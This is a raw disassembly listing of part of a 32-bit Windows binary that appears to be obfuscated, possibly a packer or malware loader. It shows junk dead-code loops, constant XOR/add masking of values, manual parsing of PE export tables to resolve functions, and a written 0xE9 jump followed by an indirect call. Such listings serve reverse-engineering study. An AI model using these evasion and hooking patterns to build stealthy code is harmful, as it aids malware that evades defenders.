  42319d:	mov    DWORD PTR ds:0x42a2ae,edi
  4231a3:	cmp    DWORD PTR ds:0x42a2ae,0xd
  4231aa:	ja     0x4231f4
  4231b0:	jmp    0x4231cb
  4231b5:	push   DWORD PTR [ebp-0x1c]
  4231b8:	push   0x7962
  4231bd:	push   0x7f76
  4231c2:	push   DWORD PTR [ebp-0x20]
  4231c5:	call   DWORD PTR ds:0x42a3de
  4231cb:	cmp    DWORD PTR ds:0x42a2ae,0xc
  4231d2:	jne    0x4231e7
  4231d8:	xor    edi,edi
  4231da:	xor    edi,DWORD PTR ds:0x42a2ae
  4231e0:	inc    edi
  4231e1:	mov    DWORD PTR ds:0x42a2ae,edi
  4231e7:	cmp    DWORD PTR ds:0x42a2ae,0x18
  4231ee:	jb     0x423196
  4231f4:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  4231fb:	adc    esi,edi
  4231fd:	mov    eax,DWORD PTR [ebp-0x1c]
  423200:	mov    ecx,DWORD PTR [ebp-0x1c]
  423203:	sub    eax,ecx
  423205:	mov    DWORD PTR [ebp-0x1c],eax
  423208:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  42320f:	mov    eax,DWORD PTR [ebp-0x20]
  423212:	mov    ecx,DWORD PTR [ebp-0x20]
  423215:	sub    eax,ecx
  423217:	mov    DWORD PTR [ebp-0x20],eax
  42321a:	mov    eax,DWORD PTR [ebp-0x2c]
  42321d:	mov    ecx,DWORD PTR [ebp-0x20]
  423220:	mov    esi,0x75108aa
  423225:	xor    eax,esi
  423227:	mov    edi,0x3272f1
  42322c:	add    eax,edi
  42322e:	or     eax,ecx
  423230:	mov    DWORD PTR [ebp-0x20],eax
  423233:	mov    eax,DWORD PTR [ebp-0x4]
  423236:	mov    ecx,DWORD PTR [ebp-0x4]
  423239:	sub    eax,ecx
  42323b:	mov    DWORD PTR [ebp-0x4],eax
  42323e:	or     DWORD PTR [ebp-0x4],0xf89c85be
  423245:	mov    eax,DWORD PTR [ebp-0xc]
  423248:	xor    eax,esi
  42324a:	add    eax,edi
  42324c:	push   eax
  42324d:	mov    eax,DWORD PTR [ebp-0x10]
  423250:	xor    eax,esi
  423252:	add    eax,edi
  423254:	push   eax
  423255:	mov    eax,DWORD PTR [ebp-0x4]
  423258:	xor    eax,esi
  42325a:	add    eax,edi
  42325c:	push   eax
  42325d:	lea    eax,[ebp-0x78]
  423260:	push   eax
  423261:	push   DWORD PTR [ebp-0x2c]
  423264:	push   DWORD PTR [ebp-0x28]
  423267:	call   0x413da8
  42326c:	test   eax,eax
  42326e:	je     0x42329c
  423274:	lea    eax,[ebp-0x78]
  423277:	push   eax
  423278:	mov    eax,DWORD PTR [ebp-0x28]
  42327b:	xor    eax,esi
  42327d:	add    eax,edi
  42327f:	push   eax
  423280:	mov    eax,DWORD PTR [ebp-0x24]
  423283:	add    eax,0xaa
  423288:	push   eax
  423289:	mov    eax,DWORD PTR [ebp-0x24]
  42328c:	mov    eax,DWORD PTR [eax+0x198]
  423292:	push   DWORD PTR [eax]
  423294:	call   0x4084f6
  423299:	mov    DWORD PTR [ebp-0x14],eax
  42329c:	mov    ecx,DWORD PTR ds:0x429516
  4232a2:	lea    eax,[ebp+0x4]
  4232a5:	mov    DWORD PTR [ecx*4+0x42950e],eax
  4232ac:	inc    DWORD PTR ds:0x429516
  4232b2:	mov    eax,DWORD PTR [ebp-0x14]
  4232b5:	test   eax,eax
  4232b7:	je     0x42331f
  4232bd:	lea    eax,[ebp-0x8]
  4232c0:	mov    DWORD PTR [ebp-0x34],eax
  4232c3:	mov    eax,DWORD PTR [ebp-0x30]
  4232c6:	mov    DWORD PTR [ebp-0x8],eax
  4232c9:	mov    eax,DWORD PTR [ebp-0x8]
  4232cc:	mov    ecx,DWORD PTR [ebp-0x14]
  4232cf:	sub    eax,ecx
  4232d1:	mov    DWORD PTR [ebp-0x8],eax
  4232d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4232d7:	xor    ecx,esi
  4232d9:	mov    eax,0xffcd8d0f
  4232de:	sub    eax,ecx
  4232e0:	add    DWORD PTR [ebp-0x8],eax
  4232e3:	mov    eax,DWORD PTR [ebp-0x8]
  4232e6:	mov    ecx,DWORD PTR [ebp-0x14]
  4232e9:	mov    DWORD PTR [ecx+0x1],eax
  4232ec:	mov    eax,DWORD PTR [ebp-0x14]
  4232ef:	push   DWORD PTR [ebp-0x24]
  4232f2:	mov    BYTE PTR [eax],0xe9
  4232f5:	mov    eax,ds:0x42929a
  4232fa:	push   DWORD PTR [eax]
  4232fc:	push   DWORD PTR ds:0x4294fe
  423302:	push   DWORD PTR ds:0x4292a2
  423308:	push   DWORD PTR ds:0x4294de
  42330e:	push   DWORD PTR ds:0x42a04a
  423314:	push   DWORD PTR [ebp-0x28]
  423317:	push   DWORD PTR [ebp-0x2c]
  42331a:	mov    eax,DWORD PTR [ebp-0x14]
  42331d:	call   eax
  42331f:	pop    edi
  423320:	pop    esi
  423321:	leave  
  423322:	ret    
  423323:	push   ebp
  423324:	mov    ebp,esp
  423326:	sub    esp,0x1c
  423329:	mov    DWORD PTR ds:0x42a2ea,0x10
  423333:	cmp    DWORD PTR ds:0x42a2ea,0x0
  42333a:	je     0x42336a
  423340:	cmp    DWORD PTR ds:0x42a2ea,0x17
  423347:	jg     0x42336a
  42334d:	jmp    0x423358
  423352:	call   DWORD PTR ds:0x42a3e2
  423358:	mov    ecx,DWORD PTR ds:0x42a2ea
  42335e:	dec    ecx
  42335f:	mov    DWORD PTR ds:0x42a2ea,ecx
  423365:	jmp    0x423333
  42336a:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  423371:	sbb    ecx,ecx
  423373:	lea    eax,[ebp+0x14]
  423376:	sub    edx,DWORD PTR ds:0x42a2da
  42337c:	mov    DWORD PTR [ebp-0x4],eax
  42337f:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  423386:	and    DWORD PTR ds:0x42a302,0x5581
  423390:	lea    eax,[ebp-0xc]
  423393:	and    DWORD PTR ds:0x42a256,0x0
  42339d:	jmp    0x4233b1
  4233a2:	xor    ecx,ecx
  4233a4:	or     ecx,DWORD PTR ds:0x42a256
  4233aa:	inc    ecx
  4233ab:	mov    DWORD PTR ds:0x42a256,ecx
  4233b1:	cmp    DWORD PTR ds:0x42a256,0x1e
  4233b8:	jae    0x423409
  4233be:	cmp    DWORD PTR ds:0x42a256,0x4
  4233c5:	jg     0x423409
  4233cb:	jmp    0x4233ea
  4233d0:	push   0x42a25a
  4233d5:	push   0x6352
  4233da:	push   0x429009
  4233df:	push   0x42904c
  4233e4:	call   DWORD PTR ds:0x42a3ea
  4233ea:	cmp    DWORD PTR ds:0x42a256,0x3
  4233f1:	jne    0x423404
  4233f7:	mov    ecx,DWORD PTR ds:0x42a256
  4233fd:	inc    ecx
  4233fe:	mov    DWORD PTR ds:0x42a256,ecx
  423404:	jmp    0x4233a2
  423409:	mov    DWORD PTR [ebp-0x14],eax
  42340c:	and    DWORD PTR ds:0x42a2f2,0x0
  423416:	jmp    0x423429
  42341b:	xor    eax,eax
  42341d:	add    eax,DWORD PTR ds:0x42a2f2
  423423:	inc    eax
  423424:	mov    ds:0x42a2f2,eax
  423429:	cmp    DWORD PTR ds:0x42a2f2,0x16
  423430:	jae    0x423462
  423436:	cmp    DWORD PTR ds:0x42a2f2,0x1d
  42343d:	jbe    0x423462
  423443:	jmp    0x42345d
  423448:	push   0x76a3
  42344d:	push   0x42a296
  423452:	push   0x659d
  423457:	call   DWORD PTR ds:0x42a3ee
  42345d:	jmp    0x42341b
  423462:	mov    eax,DWORD PTR [ebp-0xc]
  423465:	mov    edx,DWORD PTR [ebp-0x14]
  423468:	neg    ecx
  42346a:	mov    ecx,0x75108aa
  42346f:	xor    eax,ecx
  423471:	or     DWORD PTR ds:0x42a2c2,0x55df
  42347b:	add    eax,0x3272f1
  423480:	mov    DWORD PTR [edx],eax
  423482:	xor    edx,edx
  423484:	xor    edx,DWORD PTR ds:0x42a34a
  42348a:	xor    eax,eax
  42348c:	or     eax,DWORD PTR ds:0x42a35a
  423492:	sub    edx,eax
  423494:	sub    edx,DWORD PTR [edx+eax*1]
  423497:	mov    eax,ds:0x429296
  42349c:	mov    DWORD PTR ds:0x42a2da,0x16
  4234a6:	cmp    DWORD PTR ds:0x42a2da,0x0
  4234ad:	je     0x4234e5
  4234b3:	cmp    DWORD PTR ds:0x42a2da,0x1d
  4234ba:	jge    0x4234e5
  4234c0:	jmp    0x4234d3
  4234c5:	push   DWORD PTR [ebp-0x20]
  4234c8:	push   0x42a2ca
  4234cd:	call   DWORD PTR ds:0x42a3f2
  4234d3:	mov    edx,DWORD PTR ds:0x42a2da
  4234d9:	dec    edx
  4234da:	mov    DWORD PTR ds:0x42a2da,edx
  4234e0:	jmp    0x4234a6
  4234e5:	mov    edx,DWORD PTR [ebp-0x4]
  4234e8:	adc    DWORD PTR ds:0x42a2be,0x42a256
  4234f2:	mov    eax,DWORD PTR [eax]
  4234f4:	and    DWORD PTR ds:0x42a286,0x12f2
  4234fe:	add    eax,DWORD PTR [edx]
  423500:	push   esi
  423501:	mov    DWORD PTR [ebp-0x8],eax
  423504:	and    DWORD PTR ds:0x42a2f6,0x290a
  42350e:	mov    edx,DWORD PTR [ebp+0x8]
  423511:	mov    eax,ds:0x42941e
  423516:	sbb    esi,0x612f
  42351c:	mov    eax,DWORD PTR [eax+0x198]
  423522:	xor    edx,ecx
  423524:	neg    esi
  423526:	mov    esi,0x3272f1
  42352b:	add    edx,esi
  42352d:	mov    DWORD PTR ds:0x42a2b6,0x4be9
  423537:	cmp    DWORD PTR [eax],edx
  423539:	je     0x42355a
  42353f:	mov    DWORD PTR ds:0x42a2ea,0x6dae
  423549:	mov    eax,DWORD PTR [eax]
  42354b:	mov    DWORD PTR ds:0x42a2da,0x1950
  423555:	jmp    0x42399d
  42355a:	sbb    eax,DWORD PTR ds:0x42a296
  423560:	mov    eax,DWORD PTR [ebp+0x18]
  423563:	xor    eax,ecx
  423565:	adc    DWORD PTR ds:0x42a2e6,0x42a2b2
  42356f:	push   ebx
  423570:	add    eax,esi
  423572:	add    ebx,DWORD PTR ds:0x42a2a2
  423578:	xor    edx,edx
  42357a:	mov    ebx,DWORD PTR ds:0x42a2c6
  423580:	xor    DWORD PTR ds:0x42a2a2,ebx
  423586:	mov    ebx,0xfabdbed8
  42358b:	adc    DWORD PTR ds:0x42a2ae,0x6fd6
  423595:	add    eax,ebx
  423597:	mov    DWORD PTR ds:0x42a296,0x25f1
  4235a1:	push   edi
  4235a2:	mov    DWORD PTR ds:0x42a2be,0x342
  4235ac:	adc    edx,0xffffffff
  4235af:	and    DWORD PTR ds:0x42a2ee,0x0
  4235b9:	jmp    0x4235cb
  4235be:	mov    edi,DWORD PTR ds:0x42a2ee
  4235c4:	inc    edi
  4235c5:	mov    DWORD PTR ds:0x42a2ee,edi
  4235cb:	cmp    DWORD PTR ds:0x42a2ee,0x10
  4235d2:	jae    0x423614
  4235d8:	cmp    DWORD PTR ds:0x42a2ee,0x6
  4235df:	jbe    0x423614
  4235e5:	jmp    0x4235f5
  4235ea:	push   0x42a2fe
  4235ef:	call   DWORD PTR ds:0x42a3f6
  4235f5:	cmp    DWORD PTR ds:0x42a2ee,0x5
  4235fc:	jne    0x42360f
  423602:	mov    edi,DWORD PTR ds:0x42a2ee
  423608:	inc    edi
  423609:	mov    DWORD PTR ds:0x42a2ee,edi
  42360f:	jmp    0x4235be
  423614:	mov    edi,0x8a29a13d
  423619:	mov    DWORD PTR ds:0x42a25e,0x2bce
  423623:	xor    eax,edi
  423625:	sub    DWORD PTR ds:0x42a266,0x304b
  42362f:	xor    edx,0x0
  423632:	mov    DWORD PTR ds:0x42a2b2,0x550
  42363c:	cmp    eax,0x70941fe5
  423641:	mov    DWORD PTR ds:0x42a2c2,0x6d49
  42364b:	jne    0x423682
  423651:	mov    DWORD PTR ds:0x42a2fa,0x2c4a
  42365b:	cmp    edx,0xffffffff
  42365e:	mov    DWORD PTR ds:0x42a2de,0x7cde
  423668:	jne    0x423682
  42366e:	push   0xf89c85ba
  423673:	mov    DWORD PTR ds:0x42a2ca,0x25f0
  42367d:	jmp    0x42398a
  423682:	xor    DWORD PTR ds:0x42a2e2,edi
  423688:	mov    eax,DWORD PTR [ebp+0x18]
  42368b:	and    DWORD PTR ds:0x42a25a,0x42a296
  423695:	xor    eax,ecx
  423697:	add    eax,esi
  423699:	sub    DWORD PTR ds:0x42a292,0x6866
  4236a3:	xor    edx,edx
  4236a5:	or     DWORD PTR ds:0x42a25a,0x42a2e6
  4236af:	add    eax,ebx
  4236b1:	mov    DWORD PTR ds:0x42a2f6,0x1dc4
  4236bb:	adc    edx,0xffffffff
  4236be:	not    DWORD PTR ds:0x42a2ae
  4236c4:	xor    eax,edi
  4236c6:	xor    edx,0x0
  4236c9:	cmp    eax,0x70941fe7
  4236ce:	jne    0x423977
  4236d4:	cmp    edx,0xffffffff
  4236d7:	jne    0x423977
  4236dd:	mov    eax,DWORD PTR [ebp+0x10]
  4236e0:	xor    eax,ecx
  4236e2:	mov    DWORD PTR ds:0x42a2aa,0x16
  4236ec:	cmp    DWORD PTR ds:0x42a2aa,0x0
  4236f3:	je     0x423730
  4236f9:	cmp    DWORD PTR ds:0x42a2aa,0x25
  423700:	jbe    0x423730
  423706:	jmp    0x42371e
  42370b:	push   0x1425
  423710:	push   0x42a2b6
  423715:	push   DWORD PTR [ebp-0x14]
  423718:	call   DWORD PTR ds:0x42a3fa
  42371e:	mov    edx,DWORD PTR ds:0x42a2aa
  423724:	dec    edx
  423725:	mov    DWORD PTR ds:0x42a2aa,edx
  42372b:	jmp    0x4236ec
  423730:	add    eax,esi
  423732:	mov    edx,DWORD PTR ds:0x42a292
  423738:	sbb    edx,DWORD PTR ds:0x42a2de
  42373e:	mov    DWORD PTR ds:0x42a292,edx
  423744:	mov    DWORD PTR [ebp-0x18],eax
  423747:	and    DWORD PTR ds:0x42a2b6,0x0
  423751:	jmp    0x423761
  423756:	mov    eax,ds:0x42a2b6
  42375b:	inc    eax
  42375c:	mov    ds:0x42a2b6,eax
  423761:	cmp    DWORD PTR ds:0x42a2b6,0x13
  423768:	jae    0x423796
  42376e:	cmp    DWORD PTR ds:0x42a2b6,0x17
  423775:	ja     0x423796
  42377b:	jmp    0x423791
  423780:	push   0x3d13
  423785:	push   DWORD PTR [ebp-0x14]
  423788:	push   DWORD PTR [ebp-0x14]
  42378b:	call   DWORD PTR ds:0x42a402
  423791:	jmp    0x423756
  423796:	mov    eax,DWORD PTR [ebp+0xc]
  423799:	mov    edx,DWORD PTR [ebp-0x8]
  42379c:	xor    eax,ecx
  42379e:	not    DWORD PTR ds:0x42a2ea
  4237a4:	add    eax,esi
  4237a6:	imul   eax,DWORD PTR [edx]
  4237a9:	dec    edx
  4237aa:	mov    edx,DWORD PTR [ebp+0x8]
  4237ad:	xor    edx,ecx
  4237af:	add    edx,esi
  4237b1:	cmp    edx,eax
  4237b3:	mov    eax,DWORD PTR [ebp-0x4]
  4237b6:	mov    DWORD PTR ds:0x42a26a,0x1fb7
  4237c0:	je     0x4237f4
  4237c6:	mov    edx,DWORD PTR [ebp-0x18]
  4237c9:	add    DWORD PTR [eax],edx
  4237cb:	mov    eax,DWORD PTR [ebp-0x4]
  4237ce:	mov    edx,DWORD PTR [ebp+0xc]
  4237d1:	xor    edx,ecx
  4237d3:	add    edx,esi
  4237d5:	imul   edx,DWORD PTR [eax]
  4237d8:	mov    DWORD PTR [eax],edx
  4237da:	mov    eax,DWORD PTR [ebp-0x4]
  4237dd:	mov    DWORD PTR [ebp-0x1c],eax
  4237e0:	mov    eax,DWORD PTR [ebp+0x10]
  4237e3:	xor    eax,ecx
  4237e5:	mov    edx,0xffcd8d0f
  4237ea:	sub    edx,eax
  4237ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4237ef:	jmp    0x42380e
  4237f4:	mov    edx,DWORD PTR [ebp+0x14]
  4237f7:	xor    DWORD PTR [eax],edx
  4237f9:	mov    eax,DWORD PTR [ebp-0x4]
  4237fc:	mov    DWORD PTR [ebp-0x1c],eax
  4237ff:	mov    eax,DWORD PTR [ebp+0x10]
  423802:	xor    eax,ecx
  423804:	mov    edx,0xffcd8d0f
  423809:	sub    edx,eax
  42380b:	mov    eax,DWORD PTR [ebp-0x1c]
  42380e:	add    DWORD PTR [eax],edx
  423810:	mov    eax,DWORD PTR [ebp-0x4]
  423813:	mov    edx,DWORD PTR [ebp-0x8]
  423816:	add    edx,DWORD PTR [eax]
  423818:	mov    DWORD PTR [ebp-0x8],edx
  42381b:	mov    eax,DWORD PTR [ebp+0xc]
  42381e:	mov    edx,DWORD PTR [ebp+0xc]
  423821:	xor    edx,ecx
  423823:	xor    eax,ecx
  423825:	lea    eax,[eax+edx*1+0x64e5e2]
  42382c:	mov    edx,DWORD PTR [ebp+0xc]
  42382f:	xor    edx,ecx
  423831:	add    edx,esi
  423833:	imul   eax,edx
  423836:	mov    edx,DWORD PTR [ebp+0xc]
  423839:	xor    edx,ecx
  42383b:	sub    edx,eax
  42383d:	mov    eax,DWORD PTR [ebp-0x4]
  423840:	add    edx,esi
  423842:	cmp    DWORD PTR [eax],edx
  423844:	mov    eax,DWORD PTR [ebp-0x4]
  423847:	jg     0x423864
  42384d:	mov    DWORD PTR [ebp-0x1c],eax
  423850:	mov    eax,DWORD PTR [ebp+0x10]
  423853:	xor    eax,ecx
  423855:	mov    edx,0xffcd8d0f
  42385a:	sub    edx,eax
  42385c:	mov    eax,DWORD PTR [ebp-0x1c]
  42385f:	jmp    0x42386b
  423864:	mov    edx,DWORD PTR [ebp+0x10]
  423867:	xor    edx,ecx
  423869:	add    edx,esi
  42386b:	add    DWORD PTR [eax],edx
  42386d:	mov    eax,DWORD PTR [ebp-0x8]
  423870:	mov    edx,DWORD PTR [ebp-0x10]
  423873:	mov    eax,DWORD PTR [eax]
  423875:	xor    edx,ecx
  423877:	add    edx,0x3272f0
  42387d:	not    edx
  42387f:	and    eax,edx
  423881:	mov    DWORD PTR [ebp-0x4],eax
  423884:	movsx  eax,BYTE PTR [eax+0x1]
  423888:	cdq    
  423889:	add    eax,ebx
  42388b:	adc    edx,0xffffffff
  42388e:	xor    eax,edi
  423890:	xor    edx,0x0
  423893:	cmp    eax,0x70941e0f
  423898:	jne    0x4238cc
  42389e:	cmp    edx,0xffffffff
  4238a1:	jne    0x4238cc
  4238a7:	mov    eax,DWORD PTR [ebp-0x4]
  4238aa:	movsx  eax,BYTE PTR [eax]
  4238ad:	cdq    
  4238ae:	add    eax,ebx
  4238b0:	adc    edx,0xffffffff
  4238b3:	xor    eax,edi
  4238b5:	xor    edx,0x0
  4238b8:	cmp    eax,0x70941e18
  4238bd:	jne    0x4238cc
  4238c3:	cmp    edx,0xffffffff
  4238c6:	je     0x4238e3
  4238cc:	mov    eax,DWORD PTR [ebp-0x10]
  4238cf:	xor    eax,ecx
  4238d1:	mov    edx,0xffcd8d0f
  4238d6:	sub    edx,eax
  4238d8:	add    DWORD PTR [ebp-0x4],edx
  4238db:	mov    eax,DWORD PTR [ebp-0x4]
  4238de:	jmp    0x423884
  4238e3:	mov    eax,DWORD PTR [ebp-0x14]
  4238e6:	mov    eax,DWORD PTR [eax]
  4238e8:	mov    edx,DWORD PTR [ebp-0x4]
  4238eb:	mov    edx,DWORD PTR [edx+0x3c]
  4238ee:	lea    eax,[edx+eax*8+0x78]
  4238f2:	mov    edx,DWORD PTR [ebp-0x4]
  4238f5:	mov    eax,DWORD PTR [eax+edx*1]
  4238f8:	mov    DWORD PTR [ebp-0x8],eax
  4238fb:	mov    eax,DWORD PTR [ebp+0x8]
  4238fe:	xor    eax,ecx
  423900:	add    eax,esi
  423902:	mov    DWORD PTR [ebp-0x14],eax
  423905:	mov    eax,DWORD PTR [ebp+0x8]
  423908:	mov    edx,DWORD PTR [ebp-0x8]
  42390b:	xor    eax,ecx
  42390d:	add    eax,esi
  42390f:	cmp    edx,eax
  423911:	jne    0x42392f
  423917:	mov    eax,DWORD PTR [ebp+0xc]
  42391a:	xor    eax,ecx
  42391c:	mov    ecx,DWORD PTR [ebp-0x8]
  42391f:	add    eax,esi
  423921:	imul   eax,ecx
  423924:	mov    DWORD PTR [ebp-0x8],eax
  423927:	push   DWORD PTR [ebp+0x18]
  42392a:	jmp    0x42398a
  42392f:	mov    eax,DWORD PTR [ebp-0x8]
  423932:	mov    ecx,DWORD PTR [ebp-0x4]
  423935:	add    eax,ecx
  423937:	mov    DWORD PTR [ebp-0x14],eax
  42393a:	mov    eax,DWORD PTR [ebp-0x14]
  42393d:	mov    eax,DWORD PTR [eax+0xc]
  423940:	movsx  eax,BYTE PTR [eax+ecx*1]
  423944:	cdq    
  423945:	add    eax,ebx
  423947:	adc    edx,0xffffffff
  42394a:	xor    eax,edi
  42394c:	xor    edx,0x0
  42394f:	cmp    eax,0x70941e1e
  423954:	jne    0x423927
  42395a:	cmp    edx,0xffffffff
  42395d:	jne    0x423927
  423963:	mov    eax,ds:0x42941e
  423968:	mov    eax,DWORD PTR [eax+0x198]
  42396e:	mov    DWORD PTR [eax],ecx
  423970:	mov    eax,ecx
  423972:	jmp    0x42399b
  423977:	mov    eax,DWORD PTR [ebp+0x18]
  42397a:	cmp    eax,0xf89c85ba
  42397f:	jne    0x42399b
  423985:	push   0xf89c85bb
  42398a:	push   DWORD PTR [ebp+0x14]
  42398d:	push   DWORD PTR [ebp+0x10]
  423990:	push   DWORD PTR [ebp+0xc]
  423993:	push   DWORD PTR [ebp+0x8]
  423996:	call   0x423323
  42399b:	pop    edi
  42399c:	pop    ebx
  42399d:	pop    esi
  42399e:	leave  
  42399f:	ret    0x14
  4239a2:	push   ebp
  4239a3:	mov    ebp,esp
  4239a5:	and    esp,0xfffffff8
  4239a8:	mov    DWORD PTR ds:0x42a276,0x3141
  4239b2:	sub    esp,0x3fc
  4239b8:	mov    DWORD PTR ds:0x42a2fa,0x2654
  4239c2:	push   ebx
  4239c3:	push   esi
  4239c4:	adc    DWORD PTR ds:0x42a2f2,0x42a2e6
  4239ce:	push   edi
  4239cf:	xor    edi,edi
  4239d1:	or     DWORD PTR ds:0x42a256,0x42a2de
  4239db:	push   edi
  4239dc:	call   DWORD PTR ds:0x42a3b6
  4239e2:	add    DWORD PTR ds:0x42a2e2,0x667e
  4239ec:	mov    DWORD PTR [esp+0x10],eax
  4239f0:	sbb    DWORD PTR ds:0x42a2f2,0x42a27e
  4239fa:	lea    eax,[esp+0x78]
  4239fe:	push   eax
  4239ff:	sbb    DWORD PTR ds:0x42a302,0x70a3
  423a09:	push   0x429542
  423a0e:	or     DWORD PTR ds:0x42a2be,0x4f4
  423a18:	call   DWORD PTR ds:0x42a3c6
  423a1e:	mov    DWORD PTR ds:0x42a2c6,0x224d
  423a28:	cmp    eax,0xffffffff
  423a2b:	mov    DWORD PTR ds:0x42a26a,0x664
  423a35:	je     0x423a4c
  423a3b:	xor    eax,eax
  423a3d:	mov    DWORD PTR ds:0x42a2ee,0x6e63
  423a47:	jmp    0x424c9e
  423a4c:	mov    DWORD PTR ds:0x42a2ee,0x3a46
  423a56:	mov    esi,DWORD PTR ds:0x42a3fe
  423a5c:	push   0xf
  423a5e:	lea    eax,[esp+0x44]
  423a62:	xor    DWORD PTR ds:0x42a26a,0x150a
  423a6c:	push   eax
  423a6d:	push   0x429556
  423a72:	push   0x42956a
  423a77:	xor    DWORD PTR ds:0x42a2de,0x3930
  423a81:	push   0x42958a
  423a86:	call   esi
  423a88:	imul   eax,eax,0x300000
  423a8e:	cmp    eax,0x1b00000
  423a93:	jne    0x423a3b
  423a99:	sub    DWORD PTR ds:0x42a26a,0x42a2e2
  423aa3:	lea    eax,[esp+0x1b8]
  423aaa:	adc    DWORD PTR ds:0x42a28e,0x3c8a
  423ab4:	push   eax
  423ab5:	push   0x4295c6
  423aba:	call   DWORD PTR ds:0x42a3e6
  423ac0:	mov    DWORD PTR ds:0x42a2ca,0x78b4
  423aca:	cmp    eax,0xffffffff
  423acd:	mov    DWORD PTR ds:0x42a296,0x5d2d
  423ad7:	jne    0x423a3b
  423add:	and    DWORD PTR ds:0x42a25e,0x42a266
  423ae7:	push   DWORD PTR [esp+0x10]
  423aeb:	push   edi
  423aec:	call   DWORD PTR ds:0x42a3ba
  423af2:	add    DWORD PTR ds:0x42a256,0x6e9d
  423afc:	mov    DWORD PTR [esp+0x30],edi
  423b00:	or     ecx,ecx
  423b02:	mov    DWORD PTR [esp+0x20],0xf89c85a5
  423b0a:	mov    DWORD PTR ds:0x42a2ba,0x17
  423b14:	cmp    DWORD PTR ds:0x42a2ba,0x0
  423b1b:	je     0x423b7e
  423b21:	cmp    DWORD PTR ds:0x42a2ba,0x4
  423b28:	jl     0x423b7e
  423b2e:	jmp    0x423b50
  423b33:	push   0x1
  423b35:	push   0x4b19
  423b3a:	push   DWORD PTR [ebp-0x1c]
  423b3d:	push   0x1751
  423b42:	push   0x1baf
  423b47:	push   DWORD PTR [ebp-0x24]
  423b4a:	call   DWORD PTR ds:0x42a3c2
  423b50:	cmp    DWORD PTR ds:0x42a2ba,0x5
  423b57:	jne    0x423b6a
  423b5d:	mov    ecx,DWORD PTR ds:0x42a2ba
  423b63:	dec    ecx
  423b64:	mov    DWORD PTR ds:0x42a2ba,ecx
  423b6a:	xor    ecx,ecx
  423b6c:	xor    ecx,DWORD PTR ds:0x42a2ba
  423b72:	dec    ecx
  423b73:	mov    DWORD PTR ds:0x42a2ba,ecx
  423b79:	jmp    0x423b14
  423b7e:	mov    DWORD PTR [esp+0xc],0xf89c85ba
  423b86:	adc    DWORD PTR ds:0x42a292,edx
  423b8c:	lea    eax,[esp+0x3c]
  423b90:	mov    edi,DWORD PTR ds:0x42a2ba
  423b96:	or     DWORD PTR ds:0x42a26e,edi
  423b9c:	mov    DWORD PTR [esp+0x30],eax
  423ba0:	lea    eax,[esp+0x38]
  423ba4:	and    edi,ecx
  423ba6:	mov    DWORD PTR [esp+0x10],eax
  423baa:	add    edi,ecx
  423bac:	mov    eax,ds:0x42941e
  423bb1:	and    DWORD PTR ds:0x42a25a,0x0
  423bbb:	jmp    0x423bcd
  423bc0:	mov    edi,DWORD PTR ds:0x42a25a
  423bc6:	inc    edi
  423bc7:	mov    DWORD PTR ds:0x42a25a,edi
  423bcd:	cmp    DWORD PTR ds:0x42a25a,0x16
  423bd4:	jae    0x423c01
  423bda:	cmp    DWORD PTR ds:0x42a25a,0x17
  423be1:	jbe    0x423c01
  423be7:	jmp    0x423bfc
  423bec:	push   0x42a256
  423bf1:	push   0x42919f
  423bf6:	call   DWORD PTR ds:0x42a3ca
  423bfc:	jmp    0x423bc0
  423c01:	mov    eax,DWORD PTR [eax+0x1c8]
  423c07:	sbb    ebx,edi
  423c09:	mov    eax,DWORD PTR [eax]
  423c0b:	add    DWORD PTR ds:0x42a26a,0x5b95
  423c15:	mov    ecx,DWORD PTR [esp+0x10]
  423c19:	mov    edi,0x75108aa
  423c1e:	mov    ebx,DWORD PTR ds:0x42a2e6
  423c24:	sbb    DWORD PTR ds:0x42a25e,ebx
  423c2a:	xor    eax,edi
  423c2c:	adc    DWORD PTR ds:0x42a2fe,0x37f0
  423c36:	mov    ebx,0x3272f1
  423c3b:	add    DWORD PTR ds:0x42a2ae,0x42a2b2
  423c45:	add    eax,ebx
  423c47:	not    DWORD PTR ds:0x42a2ae
  423c4d:	mov    DWORD PTR [ecx],eax
  423c4f:	mov    DWORD PTR ds:0x42a2d6,0x5252
  423c59:	mov    eax,ds:0x42a11a
  423c5e:	cmp    eax,0x445cecf9
  423c63:	mov    DWORD PTR ds:0x42a2c6,0x4b3f
  423c6d:	jne    0x423d5b
  423c73:	mov    eax,DWORD PTR [esp+0x20]
  423c77:	and    DWORD PTR ds:0x42a2b6,0x0
  423c81:	jmp    0x423c93
  423c86:	mov    ecx,DWORD PTR ds:0x42a2b6
  423c8c:	inc    ecx
  423c8d:	mov    DWORD PTR ds:0x42a2b6,ecx
  423c93:	cmp    DWORD PTR ds:0x42a2b6,0x14
  423c9a:	jae    0x423ce3
  423ca0:	cmp    DWORD PTR ds:0x42a2b6,0x8
  423ca7:	ja     0x423ce3
  423cad:	jmp    0x423cc2
  423cb2:	push   0x84fb
  423cb7:	push   0x42a28e
  423cbc:	call   DWORD PTR ds:0x42a3ce
  423cc2:	cmp    DWORD PTR ds:0x42a2b6,0x7
  423cc9:	jne    0x423cde
  423ccf:	xor    ecx,ecx
  423cd1:	add    ecx,DWORD PTR ds:0x42a2b6
  423cd7:	inc    ecx
  423cd8:	mov    DWORD PTR ds:0x42a2b6,ecx
  423cde:	jmp    0x423c86
  423ce3:	mov    ecx,DWORD PTR ds:0x42941e
  423ce9:	adc    DWORD PTR ds:0x42a2be,0x42a2b2
  423cf3:	mov    ecx,DWORD PTR [ecx+0x198]
  423cf9:	adc    DWORD PTR ds:0x42a2ae,0x42a29a
  423d03:	xor    eax,edi
  423d05:	sub    DWORD PTR ds:0x42a27a,0x42a2a2
  423d0f:	add    eax,ebx
  423d11:	add    DWORD PTR ds:0x42a26a,0x42a266
  423d1b:	mov    DWORD PTR [ecx],eax
  423d1d:	mov    eax,DWORD PTR [esp+0x20]
  423d21:	xor    eax,edi
  423d23:	not    DWORD PTR ds:0x42a2be
  423d29:	add    eax,ebx
  423d2b:	sbb    DWORD PTR ds:0x42a2f6,0x42a2de
  423d35:	mov    ds:0x42a11a,eax
  423d3a:	mov    eax,DWORD PTR [esp+0x20]
  423d3e:	sbb    DWORD PTR ds:0x42a286,0x42a26a
  423d48:	xor    eax,edi
  423d4a:	sub    DWORD PTR ds:0x42a272,0x5dcc
  423d54:	add    eax,ebx
